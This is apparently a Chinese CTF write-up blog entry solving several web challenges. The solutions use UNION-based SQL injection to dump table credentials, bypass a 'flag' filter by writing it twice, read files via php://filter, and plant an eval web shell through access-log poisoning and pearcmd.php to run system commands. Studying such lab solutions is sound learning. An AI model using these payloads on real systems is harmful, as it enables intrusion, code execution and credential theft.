6.very_easy_sqli 880本题使用的是union注入（整形和字符型）
最开始通过查看源代码发现使用的是post
前面注入步骤来查询出数据库名称叫做ez.php，表名叫作users
接着通过需要查出这个表内有的所有的字段名：id,username,password
username=222&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;#&amp;password=123

然后我们需要查出这些字段下得内容，找出flag，这里采用一劳永逸的做法
username=222&#x27; union select 1,group_concat(id,username,password),3 from ez_php.users#&amp;password=123

注意：必须用group_concat才能找出字段下面的所有内容，否则只会查询出第一行的内容
7.ez_double_cmd(php伪代码协议)&lt;?phphighlight_file(__FILE__);error_reporting(0);print(&quot;easy lfi, but no flag~~&quot;);$cmd = $_POST[&#x27;cmd&#x27;];//flag in /flagif (isset($cmd)) &#123;    print (&quot;first one:&quot; . &quot;&lt;br&gt;&quot;);    $cmd = preg_replace(&quot;/flag/i&quot;, &#x27;&#x27;, $cmd);    echo $cmd;    if (preg_match(&quot;/flag/i&quot;, $cmd)) &#123;        include($cmd);    &#125;&#125; 

（1）highlight_file()函数
highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。
提示：用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。
注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！
语法： highlight_file(*filename,return*)



参数
描述



filename
必需。规定要显示的文件。


return
可选。如果该参数设置为 TRUE，该函数将以字符串形式返回高亮显示的代码，而不是直接进行输出。默认是 FALSE。


（2）preg_replace函数
作用：执行正则表达式搜索和替换的函数
基础语法： preg_replace(pattern, replacement, subject);

pattern：要搜索的模式（正则表达式）。
replacement：替换模式或者替换字符串。
subject：要进行搜索替换的源字符串或数组。

这个函数会在 subject 字符串中搜索与 pattern 匹配的内容，并使用 replacement 进行替换。可以通过正则表达式定义灵活的搜索模式，并对匹配的内容进行替换或处理。
（3）preg_match函数
作用：用于正则表达式匹配的函数之一。它用于检查字符串是否与给定的正则表达式模式匹配。
基础语法： preg_match(string $pattern, string $subject, array &amp;$matches = null, int $flags = 0, int $offset = 0): int|false

$pattern 是要匹配的正则表达式模式。
$subject 是要检查的字符串。
$matches 是一个可选参数，用于存储匹配的结果。
$flags 是一个可选参数，用于指定匹配模式。
$offset 是一个可选参数，用于指定开始搜索的位置偏移量。

preg_match() 返回成功匹配的次数（通常是 1），如果没有匹配到则返回 0，如果发生错误则返回 false。

$pattern=&quot;/flag/i&quot; 是一个正则表达式模式。在这里，/flag/i 是一个包含了两个部分的正则表达式：

/flag/：这是正则表达式的模式部分。它表示要匹配的文本模式是 “flag”。
i：这是一个修饰符，用于修改正则表达式的行为。在这里，i 是忽略大小写的修饰符，它表示匹配时不区分字母的大小写。

我们需要经过这个函数后应该还有flag这个词，所以需要双写绕过，即 cmd=flflagag；
绕过之后发现 include($cmd)木有反应，后面经过土豆哥的解释才明白有反应，只是没有显示出任何的内容
尝试用php伪协议来继续作答:
cmd=php://filter/read=convert.base64-encode/resource=/flflagag

通过这行代码成功获取到base64编码后的内容：PD9waHAKJEZMQUcgPSAiUk9JU3tkb3Vkb3VibGVibGVfY21jbWRkX3dpd2lubn0iOw==
经过base64解编码后得到 &lt;?php $FLAG = &quot;ROIS&#123;doudoubleble_cmcmdd_wiwinn&#125;&quot;;
由于FLAG是一个变量，在执行完后不会再前端显示任何内容
解法二之日志包含
仅限于日志内容不多的情况下，要不然显示不出来
首先将 User-Agent的内容改为php代码 &lt;?php eval($_POST[kang]);?&gt;
接着POST传参内容为
cmd=flflagag/../../../../../../../var/log/apache2/access.log&amp;kang=system(&#x27;cat /flag|base64&#x27;)   要有空格

最后就可以得到base64编码后的flag，解码后就得到了flag的内容
8.double_cmd_plus前文Linux上执行某个可执行文件的方式是：&#x2F;文件名eg:执行当前目录下一个hello.sh：.&#x2F;hello.sh
其实只要指定了绝对路径或者相对路径都能直接操控的

flag文件加了0600权限：意味着只有文件的所有者具有读取和写入权限，而其他用户（组成员和其他用户）没有任何权限
c文件编译后的可执行文件加了u+s权限：意味着当用户执行这个文件时，将临时使用文件所有者的权限来执行该文件，而不是使用执行用户的权限。
C文件（readflag.c）中的代码如下：
int main(void) &#123;  char flag[256] = &#123;0&#125;;  FILE* fp = fopen(&quot;/flag&quot;, &quot;r&quot;);  if (!fp) &#123;    perror(&quot;fopen&quot;);    return 1;  &#125;  if (fread(flag, 1, 256, fp) &lt; 0) &#123;    perror(&quot;fread&quot;);    return 1;  &#125;  puts(flag);  fclose(fp);  return 0;&#125;

这段代码尝试打开名为 “&#x2F;flag” 的文件，读取其内容并将其输出到标准输出。如果打开或读取文件失败，程序会打印相应的错误消息并退出
题目代码如下
&lt;?phphighlight_file(__FILE__);error_reporting(0);print (&quot;easy lfi, but no flag~~&quot;);$cmd = $_POST[&#x27;cmd&#x27;];//flag in /flagif (isset($cmd)) &#123;    print (&quot;first one:&quot; . &quot;&lt;br&gt;&quot;);    $cmd = preg_replace(&quot;/flag/i&quot;, &#x27;&#x27;, $cmd);    echo $cmd;    if (preg_match(&quot;/flag/i&quot;, $cmd)) &#123;        include($cmd);    &#125;&#125;


做题过程首先我们需要包含pearcmd.php文件才能够进行下一步，即利用pearcmd.php的漏洞插入一个文件（要用bp来操作，在重放器里面）

成功插入文件之后我们就转战hackbar
通过 cmd=flflagag../../../../../../tmp/hack.php&amp;kang=system(&#39;ls /&#39;);我们可以知道readflag文件（编译后的文件）位于根目录，所以我们需要退到根目录处去执行，即
cmd=flflagag../../../../../../tmp/hack.php&amp;kang=system(&#x27;../../../../.././readflag&#x27;);

这样子发现没有任何内容显示，查看flag文件代码后发现是因为php变量不会被直接显示在前端，于是尝试对其进行base64编码
cmd=flflagag../../../../../../tmp/hack.php&amp;kang=system(&#x27;../../../../.././readflag|base64&#x27;);

cmd=flflagag../../../../../../tmp/hack.php&amp;kang=system(&#x27;../../../../../readflag|base64&#x27;);（这样也可以的）

成功显示出编码后的flag文件内容，拿去解码后得到flag
&lt;?php$FLAG = &quot;ROIS&#123;lfitoshellissoeasy&#125;&quot;;

（其实最开始做的时候用这个方法怎么都是行不通的，但不知道为啥晚上再试一次就成功了）
再经过了豆哥的提示后明白当知道文件的绝对路径或者相对路径的时候便可以直接执行该文件，所以有下面第二种方式得到flag
cmd=flflagag../../../../../../tmp/hack.php&amp;kang=system(&#x27;/readflag|base64&#x27;);


结语这道题能够做出来还是要感谢土豆粉和土豆哥，对我解决这道题的帮助太大了
做的时候对pearcmd.php漏洞的理解还是不太深刻，对于bp的使用也不熟，导致最开始的时候浪费了很多的时间。
这道题综合能力非常强，以前用到的知识点好多都又用上了
9.easy-PDD（爆破）这道题先用bp抓包，然后用bp中的爆破模式，也就是Intruder模式来发送好多好多的请求包，得到flag
具体爆破模式操作步骤可以参考：https://blog.csdn.net/FTQOOO/article/details/103822526
10.源码泄露url&#x2F;www.zip：会下载相关源码
11.信息泄露（总）资料查看网址：https://blog.csdn.net/a597934448/article/details/105431367
12.Vim意外退出临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容
以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp第二次意外退出后，文件名为.index.php.swo第三次产生的缓存文件则为 .index.php.swn注意：index前有 “ . “
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
</search>
